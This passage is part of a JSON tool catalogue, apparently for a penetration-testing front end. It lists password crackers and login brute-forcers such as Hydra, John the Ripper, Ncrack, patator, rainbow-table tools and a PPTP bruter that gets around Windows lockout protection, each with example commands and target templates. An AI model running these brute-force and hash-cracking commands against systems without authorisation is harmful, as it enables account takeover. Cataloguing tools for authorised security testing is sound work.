    "desc": "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.\r\n\r\nIt supports: Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.",
    "example": "Attempt to login as the root user (-l root) using a password list (-P /usr/share/wordlists/metasploit/unix_passwords.txt) with 6 threads (-t 6) on the given SSH server (ssh://192.168.1.123):\r\nhydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123",
    "category": "9",
    "customInput": "Target server and port e.g ftp://10.0.0.1:21=${arg1},",
    "cmd": "hydra -L ${user_file} -P ${pass_file} ${arg1}",
    "parser": ""
  },
  {
    "name": "unshadow",
    "desc": "Combines passwd and shadow files",
    "example": "unshadow PASSWORD-FILE SHADOW-FILE",
    "category": "9",
    "customInput": "Password File=${arg1},Shadow file=${arg2},",
    "cmd": "unshadow ${arg1} ${arg2}",
    "parser": ""
  },
  {
    "name": "unique",
    "desc": "Removes duplicates from a wordlist\r\nunique [-v] [-inp=fname] [-cut=len] [-mem=num] OUTPUT-FILE [-ex_file=FNAME2] [-ex_file_only=FNAME2]",
    "example": "Using verbose mode (-v), read a list of passwords (-inp=allwords.txt) and save only unique words to a file (uniques.txt):\r\nunique -v -inp=allwords.txt uniques.txt",
    "category": "9",
    "customInput": "Original file=${arg1},Outfile=${arg2},",
    "cmd": "unique -v -inp= ${arg1} ${working_dir}/${arg2}",
    "parser": ""
  },
  {
    "name": "john",
    "desc": "",
    "example": "Using a wordlist (–wordlist=/usr/share/john/password.lst), apply mangling rules (–rules) and attempt to crack the password hashes in the given file (unshadowed.txt):\r\njohn --wordlist=/usr/share/john/password.lst --rules unshadowed.txt",
    "category": "9",
    "customInput": "File to crack=${arg1},",
    "cmd": "john --wordlist=${pass_file} --rules ${arg1}",
    "parser": ""
  },
  {
    "name": "Johnny (GUI)",
    "desc": "Johnny provides a GUI for the John the Ripper password cracking tool.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "johnny",
    "parser": ""
  },
  {
    "name": "keimpx",
    "desc": "keimpx is an open source tool, released under a modified version of Apache License 1.1.\r\nIt can be used to quickly check for valid credentials across a network over SMB. Credentials can be:\r\n    Combination of user / plain-text password.\r\n    Combination of user / NTLM hash.\r\n    Combination of user / NTLM logon session token.\r\n\r\nIf any valid credentials has been discovered across the network after its attack phase, the user is asked to choose which host to connect to and which valid credentials to use, then he will be prompted with an interactive SMB shell where the user can:\r\n    Spawn an interactive command prompt.\r\n    Navigate through the remote SMB shares: list, upload, download files, create, remove files, etc.\r\n    Deploy and undeploy his own service, for instance, a backdoor listening on a TCP port for incoming connections.\r\n    List users details, domains and password policy.",
    "example": "Read a list of IP addresses (-l /root/smbopen.txt) and attempt to login as the user victim (-U victim) with a password of s3cr3t (-P s3cr3t) with a verbosity level of 1 (-v 1), running in batch mode (-b):\r\nkeimpx -l /root/smbopen.txt -U victim -P s3cr3t -v 1 -b",
    "category": "9",
    "customInput": "Username to try and login as=${arg1},Password to try=${arg2},",
    "cmd": "keimpx -t ${target} -U ${arg1} -P ${arg2} -v 1 -b",
    "parser": ""
  },
  {
    "name": "Maskprocessor (NOT DONE)",
    "desc": "",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "multiforcer (NOT DONE)",
    "desc": "",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "Ncrack-single user",
    "desc": "Ncrack is an open source tool for network authentication cracking. It was designed for high-speed parallel cracking using a dynamic engine that can adapt to different network situations.\r\n\r\nhttps://nmap.org/ncrack/man.html",
    "example": "ncrack 10.0.0.130:21",
    "category": "9",
    "customInput": "Username=${arg1},",
    "cmd": "ncrack -vv --user ${arg1} -P ${pass_file} ${target}:${port}",
    "parser": ""
  },
  {
    "name": "Ncrack-multi user",
    "desc": "Ncrack is an open source tool for network authentication cracking. It was designed for high-speed parallel cracking using a dynamic engine that can adapt to different network situations.\r\n\r\nhttps://nmap.org/ncrack/man.html",
    "example": "ncrack 10.0.0.130:21",
    "category": "9",
    "customInput": "",
    "cmd": "ncrack -vv -U ${user_file} -P ${pass_file} ${target}:${port}",
    "parser": ""
  },
  {
    "name": "ophcrack (GUI)",
    "desc": "Ophcrack is a free Windows password cracker based on rainbow tables. It is a very efficient implementation of rainbow tables done by the inventors of the method. It comes with a Graphical User Interface and runs on multiple platforms.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "ophcrack",
    "parser": ""
  },
  {
    "name": "patator",
    "desc": "Patator is a multi-purpose brute-forcer, with a modular design and a flexible usage. Currently it supports the following modules:\r\n    ftp_login : Brute-force FTP\r\n    ssh_login : Brute-force SSH\r\n    telnet_login : Brute-force Telnet\r\n    smtp_login : Brute-force SMTP\r\n    smtp_vrfy : Enumerate valid users using the SMTP ‘VRFY’ command\r\n    smtp_rcpt : Enumerate valid users using the SMTP ‘RCPT TO’ command\r\n    finger_lookup : Enumerate valid users using Finger\r\n    http_fuzz : Brute-force HTTP\r\n    pop_login : Brute-force POP3\r\n    pop_passd : Brute-force poppassd (http://netwinsite.com/poppassd/)\r\n    imap_login : Brute-force IMAP4 – ldap_login : Brute-force LDAP\r\n    smb_login : Brute-force SMB\r\n    smb_lookupsid : Brute-force SMB SID-lookup\r\n    vmauthd_login : Brute-force VMware Authentication Daemon\r\n    mssql_login : Brute-force MSSQL\r\n    oracle_login : Brute-force Oracle\r\n    mysql_login : Brute-force MySQL\r\n    pgsql_login : Brute-force PostgreSQL\r\n    vnc_login : Brute-force VNC\r\n    dns_forward : Brute-force DNS\r\n    dns_reverse : Brute-force DNS (reverse lookup subnets)\r\n    snmp_login : Brute-force SNMPv1/2 and SNMPv3\r\n    unzip_pass : Brute-force the password of encrypted ZIP files\r\n    keystore_pass : Brute-force the password of Java keystore files",
    "example": "Do a MySQL brute force attack (mysql_login) with the root user (user=root) and passwords contained in a file (password=FILE0 0=/root/passes.txt) against the given host (host=127.0.0.1), ignoring the specified string (-x ignore:fgrep=’Access denied for user’):\r\npatator mysql_login user=root password=FILE0 0=/root/passes.txt host=127.0.0.1 -x ignore:fgrep='Access denied for user'",
    "category": "9",
    "customInput": "Module, see description=${arg1},Username=${arg2},Ignore phrase=${arg3},",
    "cmd": "patator ${arg1} user=${arg2} password=FILE0 0=${pass_file} host=${target} -x ignore:fgrep=' ${arg3} '",
    "parser": ""
  },
  {
    "name": "phrasendrescher (NOT DONE)",
    "desc": "",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "polenum",
    "desc": "polenum is a python script which uses the Impacket Library from CORE Security Technologies to extract the password policy information from a windows machine. This allows a non-windows (Linux, Mac OSX, BSD etc..) user to query the password policy of a remote windows box without the need to have access to a windows machine.",
    "example": "Get the password policy of the system by logging in with the provided username and password (victim:s3cr3t@192.168.1.200) using SMB port 445 (‘445/SMB’):\r\npolenum victim:s3cr3t@192.168.1.200 '445/SMB'",
    "category": "9",
    "customInput": "Username=${arg1},Protocol (either 445/SMB or 139/SMB)=${arg2},",
    "cmd": "polenum victim:${arg1}@${target} '${arg2}'",
    "parser": ""
  },
  {
    "name": "rcrack-hash",
    "desc": "Rainbow table password cracker",
    "example": "rcrack rt_files [rt_files ...] -h hash\r\nrcrack rt_files [rt_files ...] -l hash_list_file\r\nrcrack rt_files [rt_files ...] -f pwdump_file\r\nrcrack rt_files [rt_files ...] -n pwdump_file",
    "category": "9",
    "customInput": "Rainbow table file=${arg1},Hash=${arg2},",
    "cmd": "rcrack ${arg1} -h ${arg2}",
    "parser": ""
  },
  {
    "name": "rcrack-lanmanager",
    "desc": "Rainbow table password cracker",
    "example": "rcrack rt_files [rt_files ...] -h hash\r\nrcrack rt_files [rt_files ...] -l hash_list_file\r\nrcrack rt_files [rt_files ...] -f pwdump_file\r\nrcrack rt_files [rt_files ...] -n pwdump_file",
    "category": "9",
    "customInput": "Rainbow table file=${arg1},Password dump file=${arg2},",
    "cmd": "rcrack ${arg1} -f ${arg2}",
    "parser": ""
  },
  {
    "name": "rcrack-ntlm",
    "desc": "Rainbow table password cracker",
    "example": "",
    "category": "9",
    "customInput": "Rainbow table file=${arg1},Password dump file=${arg2},",
    "cmd": "rcrack ${arg1} -n ${arg2}",
    "parser": ""
  },
  {
    "name": "rcracki-mt",
    "desc": "rcracki_mt is a modified version of rcrack which supports hybrid and indexed tables. In addition to that, it also adds multi-core support.",
    "example": "Crack the password hash (-h 5d41402abc4b2a76b9719d911017c592) using 4 CPU cores (-t 4) and the specified rainbow tables (tables2/md5/):\r\nrcracki_mt -h 5d41402abc4b2a76b9719d911017c592 -t 4 tables2/md5/",
    "category": "9",
    "customInput": "Hash=${arg1},Rainbow table=${arg2},",
    "cmd": "rcracki_mt -h ${arg1} -t 10 ${arg2}",
    "parser": ""
  },
  {
    "name": "RSMangler (NOT DONE)",
    "desc": "RSMangler will take a wordlist and perform various manipulations on it similar to those done by John the Ripper the main difference being that it will first take the input words and generate all permutations and the acronym of the words (in order they appear in the file) before it applies the rest of the mangles.",
    "example": "Use the original wordlist (cat words.txt |) and mangle words with a minimum length of 6 (-m 6) and maximum length of 8 (-x 8), using stdin as input (–file -) and redirecting the results to a new wordlist (> mangled.txt):\r\ncat words.txt | rsmangler -m 6 -x 8 --file - > mangled.txt",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "SQLdict (GUI)",
    "desc": "SQLdict is a dictionary attack tool for SQL Server.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "sqldict",
    "parser": ""
  },
  {
    "name": "Statsprocessor (NOT DONE)",
    "desc": "Statsprocessor is a high-performance word-generator based on per-position markov-attack packed into a single stand-alone binary.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "THC-pptp-bruter",
    "desc": "Brute force program against pptp vpn endpoints (tcp port 1723). Fully standalone. Supports latest MSChapV2 authentication. Tested against Windows and Cisco gateways. Exploits a weakness in Microsoft’s anti-brute force implementation which makes it possible to try 300 passwords the second.",
    "example": "thc-pptp-bruter [options] <remote host IP>\r\n  -v        Verbose output / Debug output\r\n  -W        Disable windows hack [default: enabled]\r\n  -u <user> User [default: administrator]\r\n  -w <file> Wordlist file [default: stdin]\r\n  -p <n>    PPTP port [default: 1723]\r\n  -n <n>    Number of parallel tries [default: 5]\r\n  -l <n>    Limit to n passwords / sec [default: 100]\r\n\r\nWindows-Hack reuses the LCP connection with the same caller-id. This\r\ngets around MS's anti-brute forcing protection. It's enabled by default.",
    "category": "9",
    "customInput": "Username (administrator)=${arg1},Port (1723)=${arg2},",
    "cmd": "thc-pptp-bruter -u ${arg1} -w ${pass_file} -p ${arg2} ${target}",
    "parser": ""
  },
  {
    "name": "TrueCrack",
    "desc": "TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux and it is optimized for Nvidia Cuda technology. It supports:\r\n    PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512 and Whirlpool.\r\n    XTS block cipher mode for hard disk encryption based on encryption algorithms: AES, SERPENT, TWOFISH.\r\n    File-hosted (container) and Partition/device-hosted.\r\n    Hidden volumes and Backup headers.\r\n\r\nTrueCrack is able to perform a brute-force attack based on:\r\n    Dictionary: read the passwords from a file of words.\r\n    Alphabet: generate all passwords of given length from given alphabet.\r\n\r\nTrueCrack works on gpu and cpu",
    "example": "truecrack -t truecrypt_vol -k ripemd160 -w passes.txt",
    "category": "9",
    "customInput": "File to crack=${arg1},Key type ripemd160 | sha512 | whirlpool=${arg2},",
    "cmd": "truecrack -t ${arg1} -k ${arg2} -w ${pass_file}",
    "parser": ""
  },
  {
    "name": "WebScarab (GUI)",
    "desc": "WebScarab is designed to be a tool for anyone who needs to expose the workings of an HTTP(S) based application, whether to allow the developer to debug otherwise difficult problems, or to allow a security specialist to identify vulnerabilities in the way that the application has been designed or implemented.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "webscarab",
    "parser": ""
  },
  {
    "name": "zaproxy (GUI)",
    "desc": "The OWASP Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing as well as being a useful addition to an experienced pen testers toolbox.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "zaproxy",
    "parser": ""
  }
]